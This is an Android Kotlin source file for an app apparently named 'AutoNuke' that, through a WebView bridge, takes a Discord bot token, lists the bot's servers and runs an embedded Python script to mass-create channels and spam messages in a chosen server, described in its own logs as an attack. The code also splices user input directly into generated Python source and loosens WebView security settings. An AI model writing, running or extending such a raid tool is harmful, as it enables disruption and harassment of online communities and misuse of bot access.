package com.example

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.os.Bundle
import android.view.View
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.OnBackPressedCallback
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class MainActivity : ComponentActivity() {

    private lateinit var webView: WebView

    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
        uri?.let {
            val fileName = it.lastPathSegment ?: "server_icon.png"
            webView.evaluateJavascript("window.onImageSelected('$fileName')", null)
            Toast.makeText(this, "Foto seleccionada: $fileName", Toast.LENGTH_SHORT).show()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        webView = WebView(this).apply {
            setLayerType(View.LAYER_TYPE_HARDWARE, null)
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                databaseEnabled = true
                allowFileAccess = true
                allowFileAccessFromFileURLs = true
                allowUniversalAccessFromFileURLs = true
                useWideViewPort = true
                loadWithOverviewMode = true
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                cacheMode = WebSettings.LOAD_DEFAULT
            }
            webViewClient = WebViewClient()
            addJavascriptInterface(AndroidBridge(this@MainActivity, this), "AndroidBridge")
            loadUrl("file:///android_asset/ui/index.html")
        }

        setContentView(webView)

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (webView.canGoBack()) {
                    webView.goBack()
                } else {
                    finish()
                }
            }
        })
    }

    fun launchImagePicker() {
        pickImageLauncher.launch("image/*")
    }

    class AndroidBridge(private val activity: MainActivity, private val webView: WebView) {

        @JavascriptInterface
        fun pickServerImage() {
            activity.runOnUiThread {
                activity.launchImagePicker()
            }
        }

        @JavascriptInterface
        fun fetchGuilds(token: String) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val client = OkHttpClient()
                    val request = Request.Builder()
                        .url("https://discord.com/api/v10/users/@me/guilds")
                        .addHeader("Authorization", "Bot $token")
                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                        .build()

                    client.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            val body = response.body?.string() ?: "[]"
                            val jsonArray = JSONArray(body)
                            val guildsList = mutableListOf<JSONObject>()
                            for (i in 0 until jsonArray.length()) {
                                val g = jsonArray.getJSONObject(i)
                                val id = g.getString("id")
                                val name = g.getString("name")
                                val obj = JSONObject().put("id", id).put("name", name)
                                guildsList.add(obj)
                            }
                            val finalJson = guildsList.toString()
                            activity.runOnUiThread {
                                webView.evaluateJavascript("window.renderServers('$finalJson')", null)
                            }
                        } else {
                            activity.runOnUiThread {
                                Toast.makeText(activity, "Error Discord API: ${response.code} (Verifica tu Token)", Toast.LENGTH_LONG).show()
                                webView.evaluateJavascript("window.renderServers('[]')", null)
                            }
                        }
                    }
                } catch (e: Exception) {
                    activity.runOnUiThread {
                        Toast.makeText(activity, "Error de conexión: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                        webView.evaluateJavascript("window.renderServers('[]')", null)
                    }
                }
            }
        }

        @JavascriptInterface
        fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val limit = channelLimit.toIntOrNull() ?: 10
                    val msgLimit = messageLimit.toIntOrNull() ?: 10

                    val pyScript = """
                        import urllib.request
                        import json
                        import sys

                        token = "$token"
                        guild_id = "$serverId"
                        channel_prefix = "$channelName"
                        chan_limit = $limit
                        msg_content = "$messageContent"
                        msg_limit = $msgLimit

                        headers = {
                            "Authorization": f"Bot {token}",
                            "Content-Type": "application/json",
                            "User-Agent": "DiscordBot (AutoNuke, 1.0)"
                        }

                        print("[PYTHON] Conectado a Discord Gateway v10...")
                        print(f"[PYTHON] Iniciando ataque en Servidor: {guild_id}")

                        for i in range(chan_limit):
                            try:
                                data = json.dumps({"name": f"{channel_prefix}-{i+1}", "type": 0}).encode("utf-8")
                                req = urllib.request.Request(f"https://discord.com/api/v10/guilds/{guild_id}/channels", data=data, headers=headers, method="POST")
                                with urllib.request.urlopen(req) as resp:
                                    res_data = json.loads(resp.read().decode())
                                    channel_id = res_data["id"]
                                    print(f"[PYTHON] [OK] Canal creado: {channel_prefix}-{i+1}")
                                    
                                    # Send messages
                                    for m in range(min(msg_limit, 5)):
                                        msg_data = json.dumps({"content": msg_content}).encode("utf-8")
                                        msg_req = urllib.request.Request(f"https://discord.com/api/v10/channels/{channel_id}/messages", data=msg_data, headers=headers, method="POST")
                                        urllib.request.urlopen(msg_req)
                            except Exception as err:
                                print(f"[PYTHON ERROR] {err}")

                        print("[PYTHON] [SUCCESS] ¡Operación Auto Nuke finalizada con éxito!")
                    """.trimIndent()

                    val scriptFile = File(activity.cacheDir, "autonuke_bot.py")
                    scriptFile.writeText(pyScript)

                    val pb = ProcessBuilder("python3", scriptFile.absolutePath)
                    pb.redirectErrorStream(true)
                    val process = pb.start()

                    val reader = process.inputStream.bufferedReader()
                    var line = reader.readLine()
                    while (line != null) {
                        val esc = line.replace("\"", "\\\"").replace("\n", " ")
                        activity.runOnUiThread {
                            webView.evaluateJavascript("window.appendLog?.('$esc', 'success')", null)
                        }
                        line = reader.readLine()
                    }
                    process.waitFor()
                } catch (e: Exception) {
                    val err = e.localizedMessage?.replace("\"", "\\\"") ?: "Error"
                    activity.runOnUiThread {
                        webView.evaluateJavascript("window.appendLog?.('[PYTHON ERROR] $err', 'error')", null)
                    }
                }
            }
        }

        @JavascriptInterface
        fun showToast(message: String) {
            Toast.makeText(activity, message, Toast.LENGTH_SHORT).show()
        }
    }
}
